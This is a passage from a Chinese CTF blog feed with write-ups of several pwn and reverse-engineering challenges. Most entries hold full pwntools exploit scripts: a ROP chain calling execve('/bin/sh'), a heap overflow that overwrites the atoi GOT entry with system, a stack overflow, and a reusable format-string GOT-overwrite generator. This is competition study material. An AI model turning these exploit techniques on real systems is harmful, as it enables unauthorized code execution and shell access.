class="line"></span><br><span class="line">result = raw_input()</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">'w'</span>:</span><br><span class="line">        flag += <span class="string">'.'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">'a'</span>:</span><br><span class="line">        flag += <span class="string">'O'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">'s'</span>:</span><br><span class="line">        flag += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">'o'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = "nctf&#123;oo00OOOO...o...OO.&#125;"</span></span><br><span class="line">flag0 = <span class="string">"nctf&#123;"</span></span><br><span class="line">print(flag0+flag + <span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure><p>输入dsddssasssddddwwaa</p><p>得到flag nctf{o0oo00O000oooo..OO}</p><p>emm，有点坑。。我开头以为是从#号触发反过来走，然后错了，方向键我是盲猜的，我只能看运气，1/2</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">sub_400650</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = (*a1)--;</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">sub_400660</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1 + <span class="number">1</span>;</span><br><span class="line">  *a1 = v1;</span><br><span class="line">  <span class="keyword">return</span> v1 &lt; <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_400660(&amp;v9 + <span class="number">1</span>)</span><br><span class="line">sub_400680(&amp;v9);</span><br></pre></td></tr></table></figure><p>结合这4句，推测存储结构，一个__int64 8个字节， 2个字节一个分割，所以相当于 0x上下左右</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_400690(asc_601060, SHIDWORD(v9), v9) )</span><br></pre></td></tr></table></figure><p>在结合这句，SHIDWORD</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIDWORD(x)  (*((int32*)&amp;(x)+1))</span></span><br></pre></td></tr></table></figure><p>所以&amp;v9+1的话就是左右部分，在看内部实现，就是左右了</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ff286fcb/">https://noone-hub.github.io/posts/ff286fcb/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>红帽杯three</title>
    <url>/posts/633c637e/</url>
    <content><![CDATA[<h1 id="three"><a href="#three" class="headerlink" title="three"></a>three</h1><p>这道题我开始用了jmp ecx。。可能基础没打好吧，让我真正理解nx保护的就是这道了，为什么rop能绕过nx保护，因为rop利用的是ret一个地址，然后这个地址是本身存在代码的，而我那样是直接执行代码，错误的方式</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>3字节的任意代码执行，我想到了栈迁移，可是用的是jmp ecx，太菜了，技术不娴熟<br>这题有个小技巧，没开pie并且是写入bss段，所以/bin/sh可以自己写入后确认位置，所以直接execve(“/bin/sh”, NULL, NULL),基础rop的题目。。。</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>其中，该程序是 32 位，所以我们需要使得</p><p>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0</p><p>然后ROPgadget搞下寄存器就好了<br>bin_sh用find找到</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191115172946.png" alt></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                  mov esp, ecx</span></span><br><span class="line"><span class="string">                  ret</span></span><br><span class="line"><span class="string">                  '''</span>)</span><br><span class="line">    sa(<span class="string">"!"</span>, payload)</span><br><span class="line">    sla(<span class="string">":"</span>, <span class="number">500</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"finish\n finish\nn 5"</span>)</span><br><span class="line">    sh_addr = <span class="number">0x080c777d</span></span><br><span class="line">    int80 = <span class="number">0x08049903</span></span><br><span class="line">    pop_edx_ecx_ebx = <span class="number">0x08072fb1</span></span><br><span class="line">    pop_eax = <span class="number">0x080c11e6</span></span><br><span class="line">    shellcode = flat([</span><br><span class="line">        pop_eax,</span><br><span class="line">        <span class="number">0xb</span>,</span><br><span class="line">        pop_edx_ecx_ebx,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x80f6cdd</span>,</span><br><span class="line">        int80</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(shellcode + <span class="string">'\x00'</span> + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/633c637e/">https://noone-hub.github.io/posts/633c637e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>二进制</tag>
        <tag>writeup</tag>
        <tag>红帽杯</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title>某比赛wp.md</title>
    <url>/posts/a4f45285/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="6ce19838e66aa9404fc02dc5eba89c2fefb7f3b777511d23fcc027b6e4a8373a"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>3ctf复赛wp</title>
    <url>/posts/28402fba/</url>
    <content><![CDATA[<h1 id="3ctf-pwn-writeup"><a href="#3ctf-pwn-writeup" class="headerlink" title="3ctf pwn writeup"></a>3ctf pwn writeup</h1><h2 id="唯一一道pwn题"><a href="#唯一一道pwn题" class="headerlink" title="唯一一道pwn题"></a>唯一一道pwn题</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114225309.png" alt></p><p>emm，打比赛的时候没看出，整数溢出，然后这里就可以堆溢出了</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>buf是一开头就申请的，0x200字节大小，所以read(0, buf, size)的时候size整数溢出的话就可以无限溢出。溢出覆盖好多个chunk，这里攻击第一个fastbin就可以了，改他的结构体指针，然后改atoi就行了</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.lZOfZFQz3p/92226e82'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Input your choice:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content, encode=False)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"please input the size of secret\n"</span>, str(size))</span><br><span class="line">    sla(<span class="string">"Do you want encode(0) or decode(1) your secret ?"</span>, <span class="string">"0"</span> <span class="keyword">if</span> encode <span class="keyword">else</span> <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"please input your secret:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sa(<span class="string">":\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"1"</span>*<span class="number">0x58</span>))     </span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"2"</span>*<span class="number">0x58</span>))     </span><br><span class="line">    new(<span class="number">0x200</span>, base(<span class="string">"3"</span>*<span class="number">0x58</span>))</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">'\x00'</span>*<span class="number">0x208</span>,</span><br><span class="line">        <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x5b</span>,</span><br><span class="line">        elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">-1</span>, payload, <span class="literal">True</span>)     </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">"your secret is:\n"</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">6</span>)) - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">    lg(<span class="string">"libc_address"</span>, libc.address)</span><br><span class="line">    system = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    edit(<span class="number">0</span>, p64(system))</span><br><span class="line">    sla(<span class="string">"choice:"</span>, str(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">" size of secret\n"</span>)</span><br><span class="line">    s(<span class="string">"sh\x00\x00"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/28402fba/">https://noone-hub.github.io/posts/28402fba/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>二进制</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯练习赛</title>
    <url>/posts/c820405f/</url>
    <content><![CDATA[<h2 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h2><p>老题目</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./whoami"</span>)</span><br><span class="line"><span class="comment">#r = remote("101.71.29.5",10013)</span></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">shell_addr = <span class="number">0x400896</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">56</span>+p64(shell_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;927d379f30f26948d94a2285cd2d7bd7&#125;</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>也是老题目</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'183.129.189.60'</span> </span><br><span class="line">port = <span class="number">10043</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./5c149c66064fa'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分部分，按大小排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> part</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得排序后的大小，升序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动计算偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">## 生成payload并对齐</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write,  offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'offset is:'</span> + str(offset)</span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"%2$llx"</span>)</span><br><span class="line">    libc.address = int(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1bc590</span></span><br><span class="line">    lg(<span class="string">"libc_addr"</span>, libc.address)</span><br><span class="line">    printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    payload = fmt_payload(printf_got, system_addr, <span class="number">17</span>)</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    gdb.attach(io,'''</span></span><br><span class="line"><span class="string">               b printf</span></span><br><span class="line"><span class="string">               c</span></span><br><span class="line"><span class="string">               ''')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c820405f/">https://noone-hub.github.io/posts/c820405f/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>二进制</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯wp</title>
    <url>/posts/64ed7ea2/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
